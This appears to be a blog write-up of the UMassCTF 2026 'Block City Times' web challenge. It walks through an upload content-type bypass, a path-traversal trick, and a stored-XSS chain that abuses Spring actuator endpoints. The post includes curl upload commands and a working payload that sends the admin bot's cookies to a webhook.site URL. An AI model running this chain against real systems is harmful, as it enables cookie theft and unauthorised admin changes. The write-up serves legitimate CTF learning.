---
layout: post
title:  "The Block City Times"
date:   2026-04-13 18:52:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /UMassCTF-2026-the-block-city-times/
---

**Category**: web medium xss

**Author**: Larry (MrLarryMan)

**Description**: The Block City Times is here to inform you! [http://blockcitytimes.web.ctf.umasscybersec.org:5000/](http://blockcitytimes.web.ctf.umasscybersec.org:5000/)

I get the challenge files:
```shell
unzip DOWNLOADABLE_ASSETS.zip  
Archive:  DOWNLOADABLE_ASSETS.zip  
   creating: developer/  
  inflating: developer/package.json  
  inflating: developer/trigger-server.js  
  inflating: developer/report-api.js  
  inflating: developer/Dockerfile  
   creating: editorial/  
  inflating: editorial/Dockerfile  
  inflating: editorial/package.json  
  inflating: editorial/server.js  
   creating: src/  
   creating: src/main/  
   creating: src/main/resources/  
   creating: src/main/resources/static/  
   creating: src/main/resources/static/css/  
  inflating: src/main/resources/static/css/newspaper.css  
   creating: src/main/resources/static/images/  
  inflating: src/main/resources/static/images/Block_City_Times.png  
   creating: src/main/resources/templates/  
   creating: src/main/resources/templates/admin/  
  inflating: src/main/resources/templates/admin/metrics.html  
  inflating: src/main/resources/templates/admin/dashboard.html  
  inflating: src/main/resources/templates/admin/report.html  
   creating: src/main/resources/templates/fragments/  
  inflating: src/main/resources/templates/fragments/layout.html  
  inflating: src/main/resources/templates/login.html  
  inflating: src/main/resources/templates/error.html  
  inflating: src/main/resources/templates/submit.html  
  inflating: src/main/resources/templates/article.html  
  inflating: src/main/resources/templates/index.html  
  inflating: src/main/resources/application.yml  
   creating: src/main/java/  
   creating: src/main/java/com/  
   creating: src/main/java/com/example/  
   creating: src/main/java/com/example/demo/  
   creating: src/main/java/com/example/demo/config/  
  inflating: src/main/java/com/example/demo/config/OutboundProperties.java  
  inflating: src/main/java/com/example/demo/config/AppProperties.java  
   creating: src/main/java/com/example/demo/controller/  
   creating: src/main/java/com/example/demo/controller/admin/  
  inflating: src/main/java/com/example/demo/controller/admin/AdminController.java  
  inflating: src/main/java/com/example/demo/controller/admin/ReportController.java  
   creating: src/main/java/com/example/demo/controller/api/  
  inflating: src/main/java/com/example/demo/controller/api/ArticleRestController.java  
  inflating: src/main/java/com/example/demo/controller/api/MetricsController.java  
  inflating: src/main/java/com/example/demo/controller/api/TagController.java  
  inflating: src/main/java/com/example/demo/controller/api/ConfigController.java 
   creating: src/main/java/com/example/demo/controller/web/  
  inflating: src/main/java/com/example/demo/controller/web/NewspaperController.java  
  inflating: src/main/java/com/example/demo/controller/web/StoryController.java  
  inflating: src/main/java/com/example/demo/controller/GlobalExceptionHandler.java  
   creating: src/main/java/com/example/demo/security/  
  inflating: src/main/java/com/example/demo/security/SecurityConfig.java  
  inflating: src/main/java/com/example/demo/security/AdminProperties.java  
   creating: src/main/java/com/example/demo/model/  
  inflating: src/main/java/com/example/demo/model/Article.java  
   creating: src/main/java/com/example/demo/service/  
  inflating: src/main/java/com/example/demo/service/ViewCountService.java  
  inflating: src/main/java/com/example/demo/service/ArticleService.java  
  inflating: src/main/java/com/example/demo/Application.java  
  inflating: Block_City_Times.png  
  inflating: docker-compose.yml  
  inflating: Dockerfile  
  inflating: pom.xml

cat Dockerfile  
FROM maven:3.9-eclipse-temurin-17 AS build  
WORKDIR /app  
COPY pom.xml .  
RUN mvn dependency:go-offline -q  
COPY src ./src  
RUN mvn package -DskipTests -q  
  
FROM eclipse-temurin:17-jre  
WORKDIR /app  
  
COPY --from=build /app/target/config-demo-1.0-SNAPSHOT.jar app.jar  
  
RUN mkdir -p /app/config  
  
EXPOSE 8080  
  
ENTRYPOINT ["java", "-jar", "app.jar"]
```

There are three services:
- `app port 8080`: the main web app. only port exposed to the internet
- `editorial Node.js/Puppeteer`: a bot that logs in as admin and visits every uploaded file in a headless browser. No `FLAG` cookie. It triggers the setup phase: switching the active config to `dev` and calling `/admin/report`.
- `report-runner Node.js/Puppeteer`: a bot that logs in as admin, sets the `FLAG` cookie, then visits a given API endpoint. It will be triggered by the editorial bot’s XSS.

`report-api.js`:
```js
const puppeteer = require('puppeteer');
const fs        = require('fs');
const path      = require('path');

const BASE_URL        = process.env.BASE_URL        || 'http://localhost:8080';
const ADMIN_USERNAME  = process.env.ADMIN_USERNAME  || 'admin';
const ADMIN_PASSWORD  = process.env.ADMIN_PASSWORD  || 'changed_on_remote';
const REPORT_ENDPOINT = process.env.REPORT_ENDPOINT || '/api/config';
const FLAG            = process.env.FLAG            || 'UMASS{TEST_FLAG}';

(async () => {
  const browser = await puppeteer.launch({
    headless: 'new',
    args: ['--no-sandbox', '--disable-setuid-sandbox'],
  });

  try {
    const page = await browser.newPage();

    await page.goto(`${BASE_URL}/login`, { waitUntil: 'networkidle0' });
    await page.type('#username', ADMIN_USERNAME);
    await page.type('#password', ADMIN_PASSWORD);
    await Promise.all([
      page.waitForNavigation({ waitUntil: 'networkidle0' }),
      page.click('button[type="submit"]'),
    ]);

    if (page.url().includes('/login')) {
      console.error('Login failed.');
      process.exitCode = 1;
      return;
    }

    await page.setCookie({
      name: 'FLAG',
      value: FLAG,
    });

    const targetUrl = `${BASE_URL}${REPORT_ENDPOINT}`;
    const response  = await page.goto(targetUrl, { waitUntil: 'networkidle0' });
    const content   = await page.evaluate(() => document.body?.innerText || '');

    const status = response.status();
    console.log(JSON.stringify({
      endpoint:   targetUrl,
      timestamp:  new Date().toISOString(),
      httpStatus: status,
      isError:    status >= 400,
      content:    content.slice(0, 4000),
    }, null, 2));

  } finally {
    await browser.close();
  }
})();
```

`server.js`:
```js
const express   = require('express');
const puppeteer = require('puppeteer');
const path      = require('path');
const fs        = require('fs');

const PORT           = process.env.PORT           || 9000;
const APP_BASE_URL   = process.env.APP_BASE_URL   || 'http://localhost:8080';
const ADMIN_USERNAME = process.env.ADMIN_USERNAME || 'admin';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'blockworld';

async function openInBrowser(fileUrl) {
  const browser = await puppeteer.launch({
    headless: 'new',
    args: [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-features=HttpsUpgrades',
    ],
  });

  try {
    const page = await browser.newPage();
    await page.goto(`${APP_BASE_URL}/login`, { waitUntil: 'networkidle0' });
    await page.type('#username', ADMIN_USERNAME);
    await page.type('#password', ADMIN_PASSWORD);
    await Promise.all([
      page.waitForNavigation({ waitUntil: 'networkidle0' }),
      page.click('button[type="submit"]'),
    ]);

    const currentUrl = page.url();
    if (currentUrl.includes('/login')) {
      throw new Error('Login failed — still on login page after submit');
    }
    console.log("gothere")
    await page.goto(fileUrl, { waitUntil: 'networkidle0' });

    const text = await page.evaluate(() => document.body.innerHTML || '');

    return { text };
  } finally {
    await browser.close();
  }
}

const app = express();
app.use(express.json());

app.post('/submissions', async (req, res) => {
  const { title, author, description, filename } = req.body;

  if (!filename) {
    return res.status(400).json({ error: 'No filename provided.' });
  }

  res.json({ received: true, filename, title, author });

  const fileUrl = `${APP_BASE_URL}/files/${encodeURIComponent(filename)}`;

  try {
    await openInBrowser(fileUrl);
  } catch (err) {
    console.error('Puppeteer error:', err.message);
  }
});

app.listen(PORT, () => {
  console.log(`Editorial server running on http://localhost:${PORT}`);
});
```

`ReportController.java`:
```java
package com.example.demo.controller.admin;

import com.example.demo.config.AppProperties;
import com.example.demo.config.OutboundProperties;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.springframework.http.MediaType;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.client.RestClient;

import java.util.Map;

@Controller
@RequestMapping("/admin/report")
public class ReportController {

    private final AppProperties      appProps;
    private final OutboundProperties outboundProps;
    private final RestClient         restClient;
    private final ObjectMapper       objectMapper;

    public ReportController(AppProperties appProps, OutboundProperties outboundProps,
                            RestClient.Builder builder, ObjectMapper objectMapper) {
        this.appProps      = appProps;
        this.outboundProps = outboundProps;
        this.restClient    = builder.build();
        this.objectMapper  = objectMapper;
    }


    @GetMapping
    public String reportPage() {
        return "redirect:/admin";
    }

    @PostMapping
    public String reportError(@RequestParam(defaultValue = "/api/config") String endpoint,
                              Model model) {
        if (!appProps.getActiveConfig().equals("dev")) {
            return "redirect:/admin?error=reportdevonly";
        }
        if (!endpoint.startsWith("/api/")) {
            return "redirect:/admin?error=reportbadendpoint";
        }

        model.addAttribute("ticker",         appProps.getActive().getGreeting());
        model.addAttribute("activeConfig",   appProps.getActiveConfig());
        model.addAttribute("reportEndpoint", endpoint);

        try {
            String raw = restClient.post()
                    .uri(outboundProps.getReportUrl())
                    .contentType(MediaType.APPLICATION_JSON)
                    .body(Map.of("endpoint", endpoint))
                    .retrieve()
                    .body(String.class);

            JsonNode root = objectMapper.readTree(raw);
            JsonNode reportNode = root.path("report");
            model.addAttribute("reportSuccess", root.path("success").asBoolean(false));
            model.addAttribute("reportJson",    reportNode.isMissingNode() ? ""
                    : objectMapper.writerWithDefaultPrettyPrinter().writeValueAsString(reportNode));
            model.addAttribute("reportLog",     root.path("log").asText(""));

        } catch (Exception e) {
            model.addAttribute("reportSuccess", false);
            model.addAttribute("reportJson",    "");
            model.addAttribute("reportLog",     "Failed to reach diagnostic runner: " + e.getMessage());
        }

        return "admin/report";
    }
}
```
`ReportController.java` only checks that `endpoint.startsWith("/api/")`. Sending `/api/../files/payload.html` passes the string check but when Puppeteer normalizes the URL, it becomes `/files/payload.html`. This allows the report bot to visit an arbitrary file (my XSS payload) instead of an API endpoint.

`StoryController.java`:
```java
package com.example.demo.controller.web;

import com.example.demo.config.AppProperties;
import com.example.demo.config.OutboundProperties;
import jakarta.annotation.PostConstruct;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.core.io.FileSystemResource;
import org.springframework.core.io.Resource;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.client.RestClient;
import org.springframework.web.multipart.MultipartFile;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Map;
import java.util.UUID;

@Controller
public class StoryController {

    private final AppProperties appProps;
    private final OutboundProperties outboundProps;
    private final RestClient restClient;

    @Value("${app.upload-dir:uploads}")
    private String uploadDirConfig;

    private Path uploadDir;

    public StoryController(AppProperties appProps, OutboundProperties outboundProps,
                           RestClient.Builder builder) {
        this.appProps = appProps;
        this.outboundProps = outboundProps;
        this.restClient = builder.build();
    }

    @PostConstruct
    public void init() throws IOException {
        uploadDir = Paths.get(uploadDirConfig).toAbsolutePath().normalize();
        Files.createDirectories(uploadDir);
    }

    @GetMapping("/submit")
    public String submitForm(Model model) {
        model.addAttribute("ticker", appProps.getActive().getGreeting());
        return "submit";
    }

    @PostMapping("/submit")
    public String submitStory(@RequestParam String title,
                              @RequestParam String author,
                              @RequestParam String description,
                              @RequestParam MultipartFile file,
                              Model model) throws IOException {

        model.addAttribute("ticker", appProps.getActive().getGreeting());

        if (file.isEmpty()) {
            model.addAttribute("error", "No file was attached.");
            return "submit";
        }

        String contentType = file.getContentType();
        if (contentType == null || !outboundProps.getAllowedTypes().contains(contentType)) {
            model.addAttribute("error",
                "File type '" + contentType + "' is not accepted. " +
                "Please submit a plain text or PDF document.");
            return "submit";
        }

        String safe = file.getOriginalFilename().replaceAll("[^a-zA-Z0-9._-]", "_");
        String filename = UUID.randomUUID() + "-" + safe;
        Files.write(uploadDir.resolve(filename), file.getBytes());

        Map<String, String> body = Map.of(
            "title",       title,
            "author",      author,
            "description", description,
            "filename",    filename
        );

        ResponseEntity<String> response = restClient.post()
                .uri(outboundProps.getEditorialUrl())
                .contentType(MediaType.APPLICATION_JSON)
                .body(body)
                .retrieve()
                .toEntity(String.class);

        if (response.getStatusCode().is2xxSuccessful()) {
            model.addAttribute("success", true);
            model.addAttribute("submittedTitle", title);
        } else {
            model.addAttribute("error",
                "The system returned an error. Please try again later.");
        }

        return "submit";
    }

    @GetMapping("/files/{filename}")
    public ResponseEntity<Resource> serveFile(@PathVariable String filename) throws IOException {
        Path filePath = uploadDir.resolve(filename).normalize();

        if (!filePath.startsWith(uploadDir)) {
            return ResponseEntity.badRequest().build();
        }

        Resource resource = new FileSystemResource(filePath);
        if (!resource.exists()) {
            return ResponseEntity.notFound().build();
        }

        String contentType = Files.probeContentType(filePath);
        if (contentType == null) contentType = "application/octet-stream";

        return ResponseEntity.ok()
                .contentType(MediaType.parseMediaType(contentType))
                .body(resource);
    }
}
```

`StoryController.java` accepts the file upload and trusts `file.getContentType()` (user controlled). 

I decide to try stored XSS via file upload. `StoryController.java` validates `file.getContentType()` against an allowlist (which includes `text/plain`) but the file is later served using `Files.probeContentType()` which inspects the file extension. By sending `Content-Type: text/plain` with a `.html` filename it's possible to bypass the validation while still having the file served as `text/html`.

I upload an HTML file with `Content-Type: text/plain` in the multipart form (once I get a csrf token):
```shell
curl -c cookies.txt http://8044ba1d-3349-4f6a-80cb-590158346e48.blockcitytimes.web.ctf.umasscybersec.org/submit -o submit.html

grep -o 'name="_csrf" value="[^"]*"' submit.html  
name="_csrf" value="7FLaZg2YCxbAGhltlT88A1xFWM1f8APOQqK8q0lCJ50eQdY9jmq_UGypP3LtKnsLoBIIYTojdfU7xTTjepraynEmFKonIuEF"  
name="_csrf" value="7FLaZg2YCxbAGhltlT88A1xFWM1f8APOQqK8q0lCJ50eQdY9jmq_UGypP3LtKnsLoBIIYTojdfU7xTTjepraynEmFKonIuEF"

curl -b cookies.txt -c cookies.txt -X POST 'http://8044ba1d-3349-4f6a-80cb-590158346e48.blockcitytimes.web.ctf.umasscybersec.org/submit' -F "_csrf=7FLaZg2YCxbAGhltlT88A1xFWM1f8APOQqK8q0lCJ50eQdY9jmq_UGypP3LtKnsLoBIIYTojdfU7xTTjepraynEmFKonIuEF" -F "title=Bug Report" -F "author=Reporter" -F "description=Important story" -F "file=@payload.html;type=text/plain;filename=payload.html"
```

Contents of `payload.html`:
```html
<!DOCTYPE html>
<html><body>
<script>
(async () => {
  // when the report visits us it has the FLAG cookie set
  if (document.cookie.includes('FLAG')) {
    // exfiltrate to my server
    document.body.innerText = document.cookie;
    await fetch('https://webhook.site/5b8112d0-4e0d-496f-920e-0fd3da66a9c6?d=' + encodeURIComponent(document.cookie));
    return;
  }

  // otherwise we're the editorial bot. do setup:

  // 1. change active config to dev via spring actuator
  await fetch('/actuator/env', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({name: 'app.active-config', value: 'dev'})
  });

  // 2. refresh @RefreshScope so AppProperties picks up the new value
  await fetch('/actuator/refresh', {method: 'POST'});

  // 3. grab CSRF token from the admin dashboard
  const html = await (await fetch('/admin')).text();
  const csrf = (html.match(/name="_csrf"\s+value="([^"]+)"/) || [])[1] || '';

  // 4. trigger the report bot. path traversal: passes startsWith("/api/") check,
  //    but Puppeteer normalizes the URL so the bot actually loads this html file
  //    which now has FLAG in the cookie jar.
  const myEndpoint = '/api/..' + window.location.pathname;
  const body = new URLSearchParams({_csrf: csrf, endpoint: myEndpoint});
  await fetch('/admin/report', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: body.toString()
  });
})();
</script>
</body></html>
```

After uploading I get the flag on [https://webhook.site](https://webhook.site):
```shell
https://webhook.site/5b8112d0-4e0d-496f-920e-0fd3da66a9c6?d=FLAG%3DUMASS%7BA_mAn_h3s_f%40l13N_1N_tH3_r1v3r%7D
```

`UMASS{A_mAn_h3s_f@l13N_1N_tH3_r1v3r}`